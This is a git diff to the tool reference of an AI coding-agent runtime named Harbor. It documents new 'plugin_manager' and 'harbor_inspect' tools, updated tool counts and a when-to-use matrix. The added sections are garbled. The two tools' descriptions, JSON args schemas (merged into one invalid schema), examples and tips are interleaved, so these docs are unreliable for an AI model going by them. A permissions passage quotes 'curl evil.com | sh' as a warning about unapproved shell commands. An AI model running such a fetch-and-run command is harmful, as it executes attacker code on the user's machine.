@@ -30,6 +30,14 @@
    - [ripgrep](#ripgrep)
    - [tree](#tree)
    - [mcp](#mcp)
+   - [skill](#skill)
+   - [read_mcp_resource](#read_mcp_resource)
+   - [mcp_prompt](#mcp_prompt)
+   - [session_read](#session_read)
+   - [session_steer](#session_steer)
+   - [harbor_inspect](#harbor_inspect)
+   - [plugin_manager](#plugin_manager)
+   - [ask_user_question](#ask_user_question)
 3. ["When to use X vs Y" matrix](#3-when-to-use-x-vs-y-matrix)
 4. [Tool chains — common composition patterns](#4-tool-chains--common-composition-patterns)
 5. [Building your own tool — WebFetchTool walkthrough](#5-building-your-own-tool--webfetchtool-walkthrough)
@@ -43,21 +51,22 @@
 
 ## 1. Inventory
 
-Harbor ships **21 builtin tools** registered by `Harbor.Hosting.ToolsCatalog.CreateToolRegistry`
+Harbor ships **23 builtin tools** registered by `Harbor.Hosting.ToolsCatalog.CreateToolRegistry`
 (in `src/Harbor.Hosting/Modules/ToolsCatalog.cs`). They live in
 `src/Harbor.Tools.Builtin/Tools/<Name>/<Name>Tool.cs` and are plain `sealed` classes
 implementing `Harbor.Abstractions.Tools.ITool`.
 
 > **Tool sets**: hosts pick a `HarborToolSetKind` in `HarborComposeOptions`. `Full14`
-> (the CLI default — the enum name predates the tool count) registers all 21 tools
+> (the CLI default — the enum name predates the tool count) registers all 23 tools
 > (14 classic + `lsp` + `skill` + `read_mcp_resource` + `mcp_prompt` + `session_read` +
-> `session_steer` + `ask_user_question`); `Standard10` (name likewise predates the count — 12 members today)
-> omits the nine heavier ones (`task`, `webfetch`,
-> `ripgrep`, `mcp`, `read_mcp_resource`, `mcp_prompt`, `session_read`, `session_steer`,
-> `ask_user_question`).
+> `session_steer` + `harbor_inspect` + `plugin_manager` + `ask_user_question`); `Standard10`
+> (name likewise predates the count — 13 members today) omits the ten heavier ones
+> (`task`, `webfetch`, `ripgrep`, `mcp`, `read_mcp_resource`, `mcp_prompt`,
+> `session_read`, `session_steer`, `plugin_manager`, `ask_user_question`).
 > The Avalonia desktop app uses `Standard10` (see `apps/Harbor.App.Avalonia/AppHost.cs`).
 > `session_read` / `session_steer` also require a wired `ISessionStore`; without one the
-> catalog registers 19.
+> catalog registers 21. `plugin_manager` requires the plugin runtime to be compiled in
+> (`HarborWithPlugins=true`, the default).
 
 | # | Tool | Mode | Permission | Purpose |
 |---|------|------|------------|---------|
@@ -81,7 +90,9 @@ implementing `Harbor.Abstractions.Tools.ITool`.
 | 18 | `lsp` | Sequential | Allow | Language-server diagnostics / references / definition |
 | 19 | `session_read` | Parallel | Allow | Inspect a peer session's status, outcome and recent transcript |
 | 20 | `session_steer` | Sequential | Ask | Send a message / redirect / restart directive to a peer session |
-| 21 | `ask_user_question` | Sequential | Allow | Ask the user a structured question and read the answer back |
+| 21 | `harbor_inspect` | Parallel | Allow | Read-only catalog of what this runtime offers (tools, agents, providers, skills, plugin axes, versions, limits) |
+| 22 | `plugin_manager` | Sequential | Allow (the tool asks about every change) | List installed plugins; propose installing / removing / enabling / disabling one |
+| 23 | `ask_user_question` | Sequential | Allow | Ask the user a structured question and read the answer back |
 
 > **Why these and not more?** Every builtin earns its slot by being either (a) essential for
 > any coding task (read/write/edit/bash/glob/grep/ls), (b) a host-aware primitive that needs
@@ -1084,6 +1095,127 @@ side effect the user has not explicitly requested.
 
 ---
 
+### `plugin_manager`
+
+**Description.** The agent's window onto the plugin inventory. It reads what is
+installed in the two CS-source plugin scopes (`~/.harbor/plugins` and
+`<cwd>/.harbor/plugins`), and it PROPOSES a change — install, uninstall, enable,
+disable. The proposal is a question: the tool asks the user, through the same
+approval channel the permission service uses, and the change happens only if the
+user approves that one call. A denial, a cancellation or an unavailable approval
+channel ends the call with nothing changed (#1738).
+### `harbor_inspect`
+
+**Description.** A read-only catalog of what THIS runtime offers: the tools it has
+registered, the agents it can run, the providers it knows, the skills the model may
+load, the plugin extension axes and what each route does with them, the versions
+this build speaks, and the limits the current agent runs under.
+
+The catalog is a **projection**, never a second registry. Every section reads the
+registry that owns the fact — `IToolRegistry` for tools, `IAgentRegistry` for agents,
+`IProviderRegistry` for registered providers, `ISkillRegistry` for skills — so the
+answer describes the runtime that is running, not a list that was written down once.
+The four facts no registry owns (the Harbor version, the plugin manifest schema
+version, the extension axes with their verdicts, the provider catalogue) are copied
+out of the product's own declarations by the composition root: the axes and their
+reasons from `PluginRouteAxisRegistry` (#1723), the providers from `ProviderPresets`
+(#580), the versions from `PluginRuntimeVersions`.
+
+**Args schema.**
+
+```jsonc
+{
+  "type": "object",
+  "properties": {
+    "action": { "type": "string", "description": "What to do: 'list', 'install', 'uninstall', 'enable' or 'disable'" },
+    "name":   { "type": "string", "description": "The plugin file name as 'list' reports it (e.g. 'TodoWrite.cs') — required for uninstall, enable and disable" },
+    "source": { "type": "string", "description": "Path of the reviewed '.cs' plugin source to install — required for install" },
+    "scope":  { "type": "string", "description": "Where to install: 'global' (~/.harbor/plugins) or 'project' (<cwd>/.harbor/plugins) — install only, default 'global'" }
+  },
+  "required": ["action"]
+    "section": { "type": "string", "description": "Which part of the runtime to describe: overview (default), tools, agents, providers, skills, plugins, versions, limits" },
+    "name":    { "type": "string", "description": "One entry of that section, by its exact name (tool, agent, provider id, skill, plugin axis). Omit to list the whole section." }
+  }
+}
+```
+
+**Examples.**
+
+```jsonc
+// 1. What is installed?
+{"action": "list"}
+
+// 2. Add a reviewed plugin to the user's own scope
+{"action": "install", "source": "/home/u/reviews/TodoWrite.cs"}
+
+// 3. Add it to the project instead
+{"action": "install", "source": "/home/u/reviews/TodoWrite.cs", "scope": "project"}
+
+// 4. Take a plugin out
+{"action": "uninstall", "name": "TodoWrite.cs"}
+
+// 5. Keep it on disk but stop the host from serving it
+{"action": "disable", "name": "TodoWrite.cs"}
+```
+
+**Permissions.** `PermissionRuleset.Default` allows the tool (`plugin_manager *`)
+— that is NOT "the agent may install plugins on its own". The tool asks the user
+about every change it proposes, and the answer covers that one call: it is never
+written back to a ruleset, so the session's permission mode never changes. A
+user who does not want an agent touching plugins writes
+`new("plugin_manager", "*", Deny)` and the tool never starts. The read-only
+agents (`plan`, `explore`, `ask`, `architect`, `orchestrator`) deny it outright.
+
+**Mode.** `Sequential` (it changes files).
+
+**Tips.**
+- Call `action: "list"` first: it reports the exact file names the other
+  actions take, and an error says so ("call list and use the exact file name").
+- An install copies the reviewed source AND the manifest it ships next to it
+  (`<Name>.harbor-plugin.json`); the manifest is the plugin's declaration, and
+  the host refuses a plugin whose declaration it cannot apply.
+- A plugin that declares a Harbor floor above the running one is refused with
+  that reason — the host would refuse it at load time anyway.
+- CS plugins are served by the separate `harbor-plugins-host` process: a change
+  takes effect after that host restarts. Nothing is compiled in the CLI process.
+// 1. What does this runtime have? (one screen)
+{}
+
+// 2. Which tools are registered, and what may this agent do with each?
+{"section": "tools"}
+
+// 3. One tool in full — description, guard and JSON schema
+{"section": "tools", "name": "read"}
+
+// 4. Which plugin axes exist, and does the route carry them?
+{"section": "plugins"}
+```
+
+**Permissions.** Allow (default). Read-only by construction: the tool executes no
+tool, starts no process, writes no file and mutates no registry. Its safety profile
+is `Opaque` (it takes no path and no command) and its category is `Read`, so the
+read-only agents may ask it what the runtime has.
+
+**Mode.** `Parallel`.
+
+**Tips.**
+- The output is sized for a model's context: one line per entry, and the long tail
+  (a full JSON schema, a full verdict reason) only when one entry is asked for by
+  name.
+- An unknown name answers with what exists — `No tool named 'reed'. Registered
+  tools: bash, edit, glob, ...` — not with a bare "not found".
+- The provider section carries no credential: not the key, not the environment
+  variable that holds it. It says *whether* a key is required, and where to get one.
+- Plugin tools arrive as MCP tools (the out-of-process route), so the `plugins`
+  section names the axes and the MCP servers rather than listing plugin tools.
+- The section also reads the live plugin composition the plugin host published
+  (`inventory.json`, #1722) when there is one: the plugin's name, version,
+  phase, the axes it carries and what each door it called did. The path comes
+  from the host, never from the model.
+
+
+---
+
 ### `ask_user_question`
 
 **Description.** Asks the *user* a structured question and reads the answer
@@ -1170,7 +1302,6 @@ question channel is what the answer gates, not the permission system.
 - The console surface reads one line per question: a number picks an option,
   the option's own text picks it too, anything else is the user's own answer,
   and a leading `!` skips the rest of the batch.
-
 ---
 
 ## 3. "When to use X vs Y" matrix
@@ -1193,6 +1324,9 @@ question channel is what the answer gates, not the permission system.
 | Call an external MCP server | `mcp` | (nothing) | Only MCP bridge in the builtin set |
 | Check on a sub-agent you spawned | `session_read` | a new `task` | Reuses the peer's live context instead of restarting it |
 | Nudge a sub-agent off the wrong path | `session_steer` | (nothing) | Injects/redirects without discarding what the peer found |
+| See what plugins are installed | `plugin_manager` (`action: "list"`) | `ls ~/.harbor/plugins` | One inventory for the agent and the `/plugins` panel |
+| Add or remove a plugin | `plugin_manager` | `bash cp` | The change is proposed and the user approves it |
+| Find out what this runtime offers | `harbor_inspect` | reading the docs | Reads the live registries, so it cannot describe a runtime that is not the one running |
 | Ask the user which way to go | `ask_user_question` | (nothing) | A structured question with a bounded wait; a permission prompt cannot carry a choice |
 
 ---
@@ -1552,7 +1686,7 @@ small whitelist of read-only commands (`ls`, `cat`, `grep`, `rg`, `find`, `git s
 asks. This is correct: an agent that runs `curl evil.com | sh` without asking is a security
 incident waiting to happen.
 
-### Why `read`/`glob`/`grep`/`ls`/`tree`/`ripgrep`/`notebook`/`skill` are always Allow
+### Why `read`/`glob`/`grep`/`ls`/`tree`/`ripgrep`/`notebook`/`skill`/`harbor_inspect` are always Allow
 
 These tools have no side effects and cannot leak data outside the local machine. They're
 the agent's eyes — blocking them just slows things down without improving safety.
@@ -1560,6 +1694,11 @@ the agent's eyes — blocking them just slows things down without improving safe
 The exception is `notebook`, which DOES write to `~/.harbor/notes/<sessionId>.json`. But
 the data is scoped to the session, lives in a known location, and the agent can only
 write/append — never delete files outside that path. Allow is fine.
+
+`harbor_inspect` is the same kind of eye: it reads the registries that are already in
+memory and prints what they hold. It starts no process, writes no file and mutates no
+registry, and its output carries no credential — the provider section says *whether* a
+key is required, never the key and never the variable that holds it.
 
 ### Why `edit` denies `*.env` and `*.env.*`
 
